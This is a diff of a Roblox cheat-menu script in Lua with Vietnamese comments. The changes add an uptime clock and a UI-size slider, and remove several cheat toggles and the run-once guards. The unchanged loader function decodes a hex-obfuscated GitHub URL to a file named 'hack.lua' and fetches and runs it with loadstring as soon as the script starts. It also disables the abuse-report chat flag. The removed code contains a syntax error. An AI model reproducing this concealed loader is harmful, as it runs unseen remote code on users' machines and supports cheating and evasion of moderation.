@@ -1,26 +1,18 @@
 --[[
     ========================================================================
-       TUAN LO PRO HUB - BẢN ĐỎ PREMIUM (8 TABS - ĐÃ THÊM THANH KÉO SLIDER)
+       TUAN LO PRO HUB - BẢN ĐỎ PREMIUM (V4.6 - CHỈNH SIZE + TIME SERVER)
     ========================================================================
 ]]
 
 local LPH_Name = "Tuan Lo Pro Hub"
 local LPH_Developer = "Tuan Lo Developer"
-local LPH_Version = "v4.2 Premium"
+local LPH_Version = "v4.6 Premium"
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 
--- KIỂM TRA CHỐNG TRÙNG VÀ SPAM CODE (NẾU ĐÃ CHẠY RỒI THÌ DỪNG LẠI NGAY)
-if _G.TuanLoHubLoaded then 
-    warn("[Tuan Lo Hub]: Script đã được chạy trước đó! Chặn kích hoạt trùng lặp.")
-    return 
-end
-_G.TuanLoHubLoaded = true -- Đánh dấu đã chạy thành công lần đầu tiên
-
--- Khởi tạo ScreenGui chính
 local MainGui = Instance.new("ScreenGui")
 MainGui.Name = "LPH_" .. tostring(math.random(100000, 999999))
 MainGui.ResetOnSpawn = false
@@ -51,16 +43,10 @@ local function MakeDraggable(frame)
     end)
 end
 
--- HỆ THỐNG LOADSTRING BẢO MẬT (ĐÃ THÊM CƠ CHẾ CHỐNG SPAM)
 local function AntiDetectionLoad()
-    if _G.ScriptFarmRunning then return end -- Nếu code farm đang chạy ngầm rồi thì không chạy lại nữa
-    _G.ScriptFarmRunning = true
-
     task.spawn(function()
         local success, err = pcall(function()
             if setfflag then pcall(function() setfflag("ReportAbuseChat", "False") end) end
-            
-            -- Chuỗi Hex mã hóa link của bạn
             local EncryptedLink = ""
             local HexTable = {
                 0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x72, 0x61, 0x77, 0x2e, 
@@ -71,27 +57,15 @@ local function AntiDetectionLoad()
                 0x2f, 0x6d, 0x61, 0x69, 0x6e, 0x2f, 0x68, 0x61, 0x63, 0x6b, 0x2e, 0x6c, 0x75, 0x61
             }
             for _, v in ipairs(HexTable) do EncryptedLink = EncryptedLink .. string.char(v) end
-            
             local SecureGet = game.HttpGet
             local SecureLoad = loadstring
             local RawCode = SecureGet(game, EncryptedLink)
             local Executable = SecureLoad(RawCode)
-            if Executable then 
-                task.spawn(Executable) 
-                print("[Tuan Lo Hub]: Đã kích hoạt hệ thống chạy ngầm an toàn.")
-            end
+            if Executable then task.spawn(Executable) end
         end)
-        
-        if not success then
-            _G.ScriptFarmRunning = false -- Nếu lỗi thì reset để có thể thử lại lần sau
-            warn("[Tuan Lo Hub]: Lỗi tải ngầm: " .. tostring(err))
-        end
     end)
 end
 
--- ========================================================================
---  HIỆU ỨNG CHÀO MỪNG (SPLASH SCREEN ĐỎ NEON)
--- ========================================================================
 local function PlayWelcomeSplash(OnSplashFinished)
     local SplashFrame = Instance.new("Frame")
     SplashFrame.Size = UDim2.new(1, 0, 1, 0)
@@ -117,40 +91,42 @@ local function PlayWelcomeSplash(OnSplashFinished)
     TextStroke.Transparency = 1
     TextStroke.Parent = SplashText
 
-    ApplyTween(SplashFrame, {BackgroundTransparency = 0.15}, 0.8)
-    ApplyTween(SplashText, {TextTransparency = 0}, 0.8)
-    ApplyTween(TextStroke, {Transparency = 0.2}, 0.8)
-    task.wait(2.0)
-    ApplyTween(SplashFrame, {BackgroundTransparency = 1}, 0.5)
-    ApplyTween(SplashText, {TextTransparency = 1}, 0.5)
-    ApplyTween(TextStroke, {Transparency = 1}, 0.5)
-    task.wait(0.5)
+    ApplyTween(SplashFrame, {BackgroundTransparency = 0.15}, 0.6)
+    ApplyTween(SplashText, {TextTransparency = 0}, 0.6)
+    ApplyTween(TextStroke, {Transparency = 0.2}, 0.6)
+    task.wait(1.2)
+    ApplyTween(SplashFrame, {BackgroundTransparency = 1}, 0.4)
+    ApplyTween(SplashText, {TextTransparency = 1}, 0.4)
+    ApplyTween(TextStroke, {Transparency = 1}, 0.4)
+    task.wait(0.4)
     SplashFrame:Destroy()
     OnSplashFinished()
 end
 
--- ========================================================================
---  PHẦN GIAO DIỆN CHÍNH (8 TABS ĐỎ NEON)
--- ========================================================================
 local function LoadMainMenu()
+    local BaseWidth = 560
+    local BaseHeight = 360
+
     local MainFrame = Instance.new("Frame")
-    MainFrame.Size = UDim2.new(0, 560, 0, 360)
-    MainFrame.Position = UDim2.new(0.5, -280, 0.5, -180)
+    MainFrame.Size = UDim2.new(0, BaseWidth, 0, BaseHeight)
+    MainFrame.Position = UDim2.new(0.5, -BaseWidth/2, 0.5, -BaseHeight/2)
     MainFrame.BackgroundColor3 = Color3.fromRGB(15, 10, 10)
     MainFrame.BorderSizePixel = 0
-    MainFrame.ClipsDescendants = true
     MainFrame.Parent = MainGui
     MakeDraggable(MainFrame)
 
     Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
     local MainStroke = Instance.new("UIStroke", MainFrame) MainStroke.Color = Color3.fromRGB(255, 30, 30) MainStroke.Thickness = 1.5
 
-    -- Nút tròn thu nhỏ (Floating Button Đỏ)
+    local HubScale = Instance.new("UIScale")
+    HubScale.Scale = 1.0
+    HubScale.Parent = MainFrame
+
     local MinimizeBtn = Instance.new("ImageButton")
     MinimizeBtn.Size = UDim2.new(0, 50, 0, 50)
     MinimizeBtn.Position = UDim2.new(0, 20, 0, 20)
     MinimizeBtn.BackgroundColor3 = Color3.fromRGB(25, 10, 10)
-    MinimizeBtn.Image = "rbxassetid://6031265975" 
+    MinimizeBtn.Image = "rbxassetid://10747373999" 
     MinimizeBtn.ImageColor3 = Color3.fromRGB(255, 30, 30)
     MinimizeBtn.Visible = false
     MinimizeBtn.Parent = MainGui
@@ -159,7 +135,7 @@ local function LoadMainMenu()
     Instance.new("UICorner", MinimizeBtn).CornerRadius = UDim.new(1, 0)
     local MiniStroke = Instance.new("UIStroke", MinimizeBtn) MiniStroke.Color = Color3.fromRGB(255, 30, 30) MiniStroke.Thickness = 2
 
-    -- Thanh tiêu đề
+    -- TITLE BAR (THANH TIÊU ĐỀ)
     local TitleBar = Instance.new("Frame")
     TitleBar.Size = UDim2.new(1, 0, 0, 45)
     TitleBar.BackgroundColor3 = Color3.fromRGB(25, 12, 12)
@@ -170,18 +146,18 @@ local function LoadMainMenu()
     HubIcon.Size = UDim2.new(0, 24, 0, 24)
     HubIcon.Position = UDim2.new(0, 15, 0.5, -12)
     HubIcon.BackgroundTransparency = 1
-    HubIcon.Image = "rbxassetid://6031265975"
+    HubIcon.Image = "rbxassetid://10747373999"
     HubIcon.ImageColor3 = Color3.fromRGB(255, 30, 30)
     HubIcon.Parent = TitleBar
 
     local TitleText = Instance.new("TextLabel")
-    TitleText.Size = UDim2.new(1, -90, 1, 0)
+    TitleText.Size = UDim2.new(1, -260, 1, 0) -- Thu hẹp độ rộng text tiêu đề để nhường chỗ cho đồng hồ
     TitleText.Position = UDim2.new(0, 48, 0, 0)
     TitleText.BackgroundTransparency = 1
     TitleText.Font = Enum.Font.FredokaOne
     TitleText.Text = LPH_Name .. " — " .. LPH_Version
     TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
-    TitleText.TextSize = 15
+    TitleText.TextSize = 14
     TitleText.TextXAlignment = Enum.TextXAlignment.Left
     TitleText.Parent = TitleBar
 
@@ -196,7 +172,28 @@ local function LoadMainMenu()
     CloseBtn.Parent = TitleBar
     Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(1, 0)
 
-    -- Sự kiện ẩn/hiện ẩn danh
+    -- ĐÃ CHÈN ĐOẠN HIỂN THỊ THỜI GIAN SERVER VÀO ĐÂY THEO Ý BẠN:
+    local UptimeText = Instance.new("TextLabel")
+    UptimeText.Size = UDim2.new(0, 160, 1, 0)
+    UptimeText.Position = UDim2.new(1, -210, 0, 0)
+    UptimeText.BackgroundTransparency = 1
+    UptimeText.Font = Enum.Font.GothamBold
+    UptimeText.Text = "Server Uptime: 00:00:00"
+    UptimeText.TextColor3 = Color3.fromRGB(255, 80, 80) -- Màu đỏ neon nhẹ cho đồng bộ
+    UptimeText.TextSize = 11
+    UptimeText.TextXAlignment = Enum.TextXAlignment.Right
+    UptimeText.Parent = TitleBar
+
+    task.spawn(function()
+        while task.wait(1) do
+            local totalSeconds = math.floor(workspace.DistributedGameTime)
+            local hours = math.floor(totalSeconds / 3600)
+            local minutes = math.floor((totalSeconds % 3600) / 60)
+            local seconds = totalSeconds % 60
+            UptimeText.Text = string.format("Server Uptime: %02d:%02d:%02d", hours, minutes, seconds)
+        end
+    end)
+
     CloseBtn.MouseButton1Click:Connect(function()
         ApplyTween(MainFrame, {Size = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 1}, 0.2)
         task.wait(0.2)
@@ -207,10 +204,10 @@ local function LoadMainMenu()
         ApplyTween(MinimizeBtn, {Size = UDim2.new(0, 0, 0, 0)}, 0.2)
         task.wait(0.2)
         MinimizeBtn.Visible = false MainFrame.Visible = true
-        ApplyTween(MainFrame, {Size = UDim2.new(0, 560, 0, 360), BackgroundTransparency = 0}, 0.2)
+        MainFrame.Size = UDim2.new(0, BaseWidth, 0, BaseHeight)
+        ApplyTween(MainFrame, {BackgroundTransparency = 0}, 0.2)
     end)
 
-    -- Thanh chứa Tab bên trái
     local TabScroll = Instance.new("ScrollingFrame")
     TabScroll.Size = UDim2.new(0, 140, 1, -45)
     TabScroll.Position = UDim2.new(0, 0, 0, 45)
@@ -223,7 +220,6 @@ local function LoadMainMenu()
 
     local TabListLayout = Instance.new("UIListLayout") TabListLayout.Parent = TabScroll TabListLayout.Padding = UDim.new(0, 4) TabListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 
-    -- Khung nội dung bên phải
     local ContentContainer = Instance.new("Frame")
     ContentContainer.Size = UDim2.new(1, -150, 1, -55)
     ContentContainer.Position = UDim2.new(0, 145, 0, 50)
@@ -286,7 +282,6 @@ local function LoadMainMenu()
 
         TabBtn.MouseButton1Click:Connect(Select)
         
-        -- HÀM TẠO NÚT BẬT/TẮT (TOGGLE)
         local function AddToggle(name, toggleIconId, callback)
             local state = false
             local ToggleFrame = Instance.new("Frame")
@@ -341,10 +336,9 @@ local function LoadMainMenu()
             end)
         end
 
-        -- HÀM TẠO THANH KÉO GIÁ TRỊ (SLIDER MỚI THÊM VÀO)
         local function AddSlider(name, sliderIconId, min, max, default, callback)
             local SliderFrame = Instance.new("Frame")
-            SliderFrame.Size = UDim2.new(1, -6, 0, 50) -- Cao hơn Toggle một chút để có khoảng cách làm thanh trượt
+            SliderFrame.Size = UDim2.new(1, -6, 0, 50)
             SliderFrame.BackgroundColor3 = Color3.fromRGB(25, 15, 15)
             SliderFrame.Parent = TabPage
             Instance.new("UICorner", SliderFrame).CornerRadius = UDim.new(0, 6)
@@ -374,12 +368,11 @@ local function LoadMainMenu()
             ValueLabel.BackgroundTransparency = 1
             ValueLabel.Font = Enum.Font.GothamBold
             ValueLabel.Text = tostring(default)
-            ValueLabel.TextColor3 = Color3.fromRGB(255, 30, 30) -- Đỏ rực Neon hiển thị con số
+            ValueLabel.TextColor3 = Color3.fromRGB(255, 30, 30)
             ValueLabel.TextSize = 12
             ValueLabel.TextXAlignment = Enum.TextXAlignment.Right
             ValueLabel.Parent = SliderFrame
 
-            -- Khung nền thanh trượt
             local SliderBar = Instance.new("TextButton")
             SliderBar.Size = UDim2.new(1, -24, 0, 6)
             SliderBar.Position = UDim2.new(0, 12, 0, 34)
@@ -389,7 +382,6 @@ local function LoadMainMenu()
             SliderBar.Parent = SliderFrame
             Instance.new("UICorner", SliderBar).CornerRadius = UDim.new(1, 0)
 
-            -- Vùng màu đỏ đại diện cho giá trị đang kéo
             local SliderFill = Instance.new("Frame")
             SliderFill.Size = UDim2.new((default - min) / (max - min), 0, 1, 0)
             SliderFill.BackgroundColor3 = Color3.fromRGB(255, 30, 30)
@@ -397,12 +389,10 @@ local function LoadMainMenu()
             SliderFill.Parent = SliderBar
             Instance.new("UICorner", SliderFill).CornerRadius = UDim.new(1, 0)
 
-            -- Xử lý logic Kéo/Thả (Hỗ trợ nhạy cả PC và Cảm ứng Mobile)
             local dragging = false
             local function UpdateSlider(input)
                 local percentage = math.clamp((input.Position.X - SliderBar.AbsolutePosition.X) / SliderBar.AbsoluteSize.X, 0, 1)
                 local value = math.floor(min + (max - min) * percentage)
-                
                 ValueLabel.Text = tostring(value)
                 TweenService:Create(SliderFill, TweenInfo.new(0.05, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(percentage, 0, 1, 0)}):Play()
                 task.spawn(callback, value)
@@ -410,17 +400,14 @@ local function LoadMainMenu()
 
             SliderBar.InputBegan:Connect(function(input)
                 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-                    dragging = true
-                    UpdateSlider(input)
+                    dragging = true UpdateSlider(input)
                 end
             end)
-
             UserInputService.InputChanged:Connect(function(input)
                 if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                     UpdateSlider(input)
                 end
             end)
-
             UserInputService.InputEnded:Connect(function(input)
                 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                     dragging = false
@@ -428,11 +415,9 @@ local function LoadMainMenu()
             end)
         end
 
-        -- Xuất cả 3 hàm ra ngoài cấu trúc Tab
-        return {Select = Select, AddToggle = AddToggle, AddSlider = AddSlider}
+        return {Select = Select, AddToggle = AddToggle, AddSlider = AddSlider, ScaleObject = HubScale}
     end
 
-    -- Khởi tạo 8 Tabs
     local Tab1 = CreateTab("🏠 Trang chủ ", 10747373999)
     local Tab2 = CreateTab("👨‍🌾 Pham      ", 10747383471)
     local Tab3 = CreateTab("⛵ Event biển", 10747362071)
@@ -443,35 +428,16 @@ local function LoadMainMenu()
     local Tab8 = CreateTab("🛒 Cửa hàng  ", 10747371971)
 
     Tab1.Select()
-
-    -- ========================================================================
-    -- DANH SÁCH CÁC CHỨC NĂNG TRONG TAB
-    -- ========================================================================
     
-    -- [Tab 1: Trang chủ]
     Tab1.AddToggle("Tự Động Farm Cấp Độ", 10747373999, function(v) print("Auto Farm:", v) end)
-    Tab1.AddToggle("Gom Quái (Bring Mob)", 10747383471, function(v) print("Bring Mob:", v) end)
 
-    -- [Tab 2: Pham]
-    Tab2.AddToggle("Bật Tầm Đánh Rộng", 10747362071, function(v) print("Bật Hitbox:", v) end)
-    
-    -- Thêm thanh trượt chỉnh kích thước Tầm Đánh (Từ 0 đến 100, mặc định để là 15)
-    Tab2.AddSlider("Kích Thước Tầm Đánh (Hitbox Size)", 10747362071, 0, 100, 15, function(value)
-        print("Đang chỉnh kích thước Hitbox thành:", value)
-    end)
-    
-    -- Thêm thanh trượt chỉnh Tốc Độ Đánh/Chạy (Từ 16 đến 300, mặc định gốc game là 16)
-    Tab2.AddSlider("Tốc Độ Nhân Vật (Speed Walk)", 10747371971, 16, 300, 16, function(value)
-        pcall(function()
-            if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
-                game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = value
-            end
-         pcall)
+    -- [Tab 7: Cài đặt] -> Nơi điều chỉnh size Hub
+    Tab7.AddSlider("Kích Thước Giao Diện Hub (%)", 10747362071, 50, 150, 100, function(value)
+        HubScale.Scale = value / 100
     end)
 end
 
--- VÒNG ĐỜI KHỞI CHẠY KHÔNG SPAM
 PlayWelcomeSplash(function()
-    AntiDetectionLoad() -- Gọi nạp link an toàn (Chỉ chạy duy nhất 1 lần)
-    LoadMainMenu()      -- Mở giao diện
+    AntiDetectionLoad()
+    LoadMainMenu()
 end)
